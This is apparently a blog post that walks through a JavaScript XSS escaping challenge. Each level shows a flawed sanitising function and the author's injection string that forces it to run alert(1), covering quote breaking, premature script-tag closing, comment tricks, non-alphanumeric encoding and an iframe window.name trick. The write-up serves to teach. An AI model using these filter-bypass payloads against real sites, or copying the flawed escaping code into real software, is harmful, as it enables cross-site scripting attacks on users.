JavaScript earned reputation of tricky and well, the most popular language nowadays. But in day-to-day programming life software engineers try to avoid any hacks, shortcuts and tricks. This make code simple, easy to maintain and even reliable.
Although there is a flip side of the coin - security, which requires more deep understanding of how the language and the browser works. The world have seen a lot of examples of XSS and other JavaScript-based attacks even on such reliable websites as Facebook, Facebook, Google, Google - just to list few recent attacks. Therefore when I came by this nifty JavaScript escaping challenge I immediately decided to test my skills.

Spoiler Alert: I’m going to walk through each challenge and explain my solution for it. So if you want to test your knowledge of JavaScript first - stop reading and come back only if you desparate.

If you reading this line, means that you either stuck somewhere in the middle of the quiz or just want to learn something new about JavaScript. Welcome.

Each challenge consists in a given JavaScript function which accepts single parameter - string. Your job is to write such a string, that will force the function to execute `alert(1)`.

Challenge 0
-----------
function escape(s) {
  // Warmup.
  return '<script>console.log("'+s+'");</script>';
}
Solution
-----------
");alert(1)//
The resulting html will be
<script>console.log("");alert(1)//");</script>
which is completely different from what an author intended to do there.

Challenge 1
-----------
function escape(s) {
  // Escaping scheme courtesy of Adobe Systems, Inc.
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
Solution
-----------
\");alert(1)//
By passing solution from the previous challenge we will end up with
<script>console.log("\");alert(1)//");</script>
Where part \");alert(1)// considered as a string, but if we escape the escape symbol “\” then our double quote became unescaped again.

Challenge 2
-----------
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
Solution
-----------
</script><script>alert(1)</script>
JSON.stringify will escape both double quote and backslash, so we cannot use trick from the previous challenge. But we may rely on how browser tokenizer works and trick it to find our script closing tag earlier than an original one. The resulting html will be
<script>console.log(“</script><script>alert(1)</script>”;</script>
where first script block will throw Syntax error and the second one will be executed properly.

Challenge 3
-----------
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
Solution
-----------
%22), alert(1)//
Another “side effect” of JSON.stringify is that it will add double quotes around passed string, so if we will pass “foo” (without quotes) string the escape function will produce the following:

<a href='javascript:console.log("foo")'></a>

As in previous challenges, we cannot simply use “ (double quote) symbol to end string statement earlier. But since we’re in href attribute, we can use url encoded double quote which is %22 :

<a href='javascript:console.log("%22), alert(1)//")'></a>

Challenge 4
-----------
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace('"', '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}

Solution
-----------
[[a|"" onload=alert(1)//]]
A common pattern would be to create onerror=”alert(1)” attribute on img tag and point image to some non-existing url. But escape function replaces double quote with its html-encoded version. Luckily only first quote will be replaced (no global flag in second replace function call).
Also, after brief investigation it appears that server will load any image with alphanumeric name, i.e. a.gif is a valid image. So we have to use onload callback instead of onerror and two double quotes instead of one, the resulting html will look like this:
<img alt="&quot;" onload=alert(1)//" src="a.gif">

Challenge 5
-----------
function escape(s) {
  // Level 4 had a typo, thanks Alok.
  // If your solution for 4 still works here, you can go back and get more points on level 4 now.

  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
Solution
-----------
[[a|http://onload=alert(1)//]]
The challenge is pretty similar to what we had in previous challenge, but now a developer fixed his bug and all double quotes will be replaced. What should we do now? Can we borrow double quote from somewhere else then? Maybe. Anchor tag have some double quotes, so if img alt attribute will contain some http:// string, it will be replaced with <a href=”http://”>http://</a>
and then used in alt attribute.
After url replacement text will look like this:

[[a|<a href="http://onload=alert(1)//]]">http://onload=alert(1)//]]</a>

And after second one:
<img alt="<a href=" http://onload=alert(1)//" src="a.gif"> ">http://onload=alert(1)//]]</a>
And the browser will parse it as
<img alt="&lt;a href=" http:="" onload="alert(1)//&quot;" src="a.gif"> "&gt;http://onload=alert(1)//]]

Challenge 6
-----------
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
Solution
-----------
Comment#--><script>alert(1)</script>
This challenge requires good understanding of document object and its methods. Method createComment will generate <!-- --> html. But since we can add basically anything between those brackets, we can force browser to close comment section earlier (by passing -->) and write arbitrary html after that.

Challenge 7
-----------
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
Solution
-----------
'#',alert(1)//
By looking into regex inside if statement we can see what kind of functions we can run in resulting <script> tag. My first temptation was to compromise this function by having something like <script>eval(“alert(1)”)</script>. But unfortunately it is impossible here since we construct valid JSON object named obj and then stringify it. Also we cannot trick browser’s tokenizer and close script tag earlier (like in Challenge 2), because < symbol will be encoded.
This is where frustration out-of-the-box thinking comes into the scene. What if this shouldn’t be function invocation at all? What kind of javascript expression can we build here?
<script>'({"userdata":"',alert(1)//"})</script>
Code inside the script tag will be considered as single line expression [String], [Function invocation] [Comment]
It doesn’t matter what separator do you use , (comma) or ; (semicolon) - both will produce valid javascript expression.

Challenge 8
-----------
function escape(s) {
  // Courtesy of Skandiabanken
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
Solution
-----------
Current and next challenges are based on two JavaScript principles/features:
1. You can obtain any alphanumeric symbol by using type conversions and accessing characters by their index in the string. For example, the following expression will output symbol ‘a’:

 (''+0/0)[1]

Let’s figure out why this happens. 0/0 will produce NaN object. Then we implicitly converting it to string by adding it to empty string, so we will have string ‘NaN’ at the end. Now we simply get character at index 1 which is ‘a’.

2. You can run arbitrary code by passing it into Function’s constructor. So once we construct string ‘alert(1)’ we can write

Function(‘alert(1)’)()

Please note last two braces in my code - they tell browser to run the function we’ve just created from the string. But there is one more problem - we cannot have Function word since it will be converted to FUNCTION and won’t work. But luckily functions play constructor’s role in JavaScript, so constructor’s constructor should be plain Function function. In other words

JSON.stringify.constructor(‘alert(1)’)()

will be equal to

Function(‘alert(1)’)()


Eventually we have to construct the following string

“); JSON[‘stringify’][‘constructor’](‘alert(1)’)()//

Where all alpha-characters should be replaced with alpha-less character encoding shown above. If you’re as lazy as myself here are couple online tools which will do it for you:
http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html
http://www.jsfuck.com/

Challenge 9
-----------
function escape(s) {
  // This is sort of a spoiler for the last level :-)
  if (/[\\<>]/.test(s)) return '-';
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
Solution
The same solution as in previous challenge. Actually I think encoding

</script><script>alert(1)//

will work for previous example (but not for current one), so presumably I had to come up with it first and use my JSON-based solution here.

Challenge 10
-----------
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g,
        function(_, n) {
           return htmlEscape(args[n]);
         });
  }

  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
Solution
-----------
\x3c\x2f\x61\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x22\x22\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x22

We all know that JavaScript code may consists in set of Unicode characters, but ECMAScript, the standardized version of JavaScript, spec says:
ECMAScript source text is assumed to be a sequence of 16-bit code units for the purposes of this specification…
...In string literals, regular expression literals, and identifiers, any character (code unit) may also be expressed as a Unicode escape sequence consisting of six characters, namely \u plus four hexadecimal digits...

Which means that we can represent single character by sequence of characters, for example

‘a’ === ‘\u0061’

This way htmlEscape function won’t be able to find encoded symbols and replace it (since it is working with string which represent code, but not with code representation itself). So it is sufficient to just encode the following string:

</a><img src="" onerror="alert(1)"

Challenge 11
-----------
function escape(s) {
  // Spoiler for level 2
  s = JSON.stringify(s).replace(/<\/script/gi, '');
  return '<script>console.log(' + s + ');</script>';
}
Solution
-----------
</</scriptscript><script>alert(1)</</scriptscript>

In order to solve this problem we have to understand how replace method works. First it will run regex on original string and remember all the matches, then it simply replace each match/substring with replaceValue (which is empty string in our case). It will do it only once, so </</scriptscript> will became just </script>.

Challenge 12
-----------
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
Solution
-----------
'#',alert(1)<!--

This challenge is very similar to #7, but it will escape all “/” (forward slash) symbols. So we cannot comment out the rest of the string “) like we did in challenge #7. But “//” is not the only way to comment out code in JavaScript. We can try multiline comment “/*”, but it won’t work since it has forward slash in it. Luckily script tag is part of html document, so it is valid to contain html comments which starts with “<!--”.
Challenge 13
-----------
function escape(s) {
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // http://print.alf.nu/?html=... just outputs whatever you pass in.
  //
  // Alerting from print.alf.nu won't count; try to trigger the one below.

  s = '<script>' + s + '<\/script>';
  tag.src = 'http://print.alf.nu/?html=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.onload = function() {
    if (youWon) alert(1);
  };
  document.body.appendChild(tag);
}
Solution
-----------
name="youWon"

This challenge has pretty simple solution, but it took me some time till “aha” moment. Here we’re allowed to write any JavaScript code inside child iframe, but we have to trick parent iframe to run alert(1). And the problem is that those iframes have different subdomains, which means CSP will prevent child iframe to access parent’s environment.
But there is one old-and-forgotten way to communicate between iframes from different origins - by using window.name. So if we set window.name in nested iframe, parent page will be able to access it.
Now, when child iframe has its name equal to youWon, lets focus on parent page. Due to historical reasons global Window object supports named properties:
The supported property names at any moment consist of the following, in tree order, ignoring later duplicates:
the browsing context name of any child browsing context of the active document whose name is not the empty string,
    …
Which means that when I try to access window.youWon (on parent page) it will return child browsing context - child iframe.
And last peace of the puzzle - context of tag.onload function will be window, so if(youWon) technically equal to if(window.youWon).

Challenge 14
-----------
function escape(s) {
  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
  function html(s) { return s.replace(/[<>"&]/g, function(s) {
                        return '&#' + s.charCodeAt(0) + ';'; }); }

  return (
    '<script>' +
      'var url = ' + json(s) + '; // We\'ll use this later ' +
    '</script>\n\n' +
    '  <!-- for debugging -->\n' +
    '  URL: ' + html(s) + '\n\n' +
    '<!-- then suddenly -->\n' +
    '<script>\n' +
    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
    '  else new Image().src = url;\n' +
    '</script>'
  );
}
Solution
-----------
'<!--<script>';if({test:function(){Image=function(){alert(1)}}}/*
To be honest I had no idea of how to approach this challenge when I saw it for first time. But over the time I noted two html comments which looks redundant. So I started looking into the spec again (looking for html comments) and here what I found:
<script>
  var example = 'Consider this string: <!-- <script>';
  console.log(example);
</script>
<!-- despite appearances, this is actually part of the script still! -->
<script>
 ... // this is the same script block still...
</script>

I’ll not go into detailed explanations here (since this blog post is way too long already), but I highly encourage you to read either the spec or this blog post from Jon Passki. In summary, having <!--<script> string inside <script> tag will prevent browser to recognize next closing tag </script> and will look either for closing comment tag --> or another closing script tag.
But this is just part of the story, since having <!--</script> will cause SyntaxError: Unexpected token &
<script>var url = "<!--<script>"; // We'll use this later </script>

  <!-- for debugging -->
  URL: &#60;!--&#60;script&#62;
This is because URL: &#60 is part of <script> tag and considered as JavaScript expression. In order to solve this problem we put <!--<script> in single quotes, so code looks like this
<script>var url = "'<!--<script>'"; // We'll use this later </script>

  <!-- for debugging -->
  URL: '&#60;!--&#60;script&#62;'

<!-- then suddenly -->
<script>
  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);
  else new Image().src = url;
</script>
And now we observe an error in different place SyntaxError: Unexpected token if
This is because expression <script>if was considered as invalid JavaScript expression. Luckily we can convert this part into comment by having /* in our initial payload, so it will look like

/*<!-- then suddenly -->
<script>
if (!/^http:.*/

Ahhh, another SyntaxError: Unexpected token )
Now browser tries to parse this expression
URL:‘...’/*...*/.test(url))
First part URL:’...’ will result into just a string ‘...’ since URL is bulitin function and you cannot override its value.
Having multiline comments between operands or property accessors is legal in JavaScript. So eventually browser is trying to figure out how to execute this code
‘...’.test(url))
and last brace is redundant here. Okay, we can compensate it by having another opening brace, but now it will try to run test method on string and will fail because there is no method test on strings. So we can make it run test method not on a string, but on our object

{ test: function(){ Image=function(){ alert(1) } }

Also we may want to have if statement in our payload as well, in order to avoid another syntax error (see else statement below the if statement?). And here we can celebrate the victory!
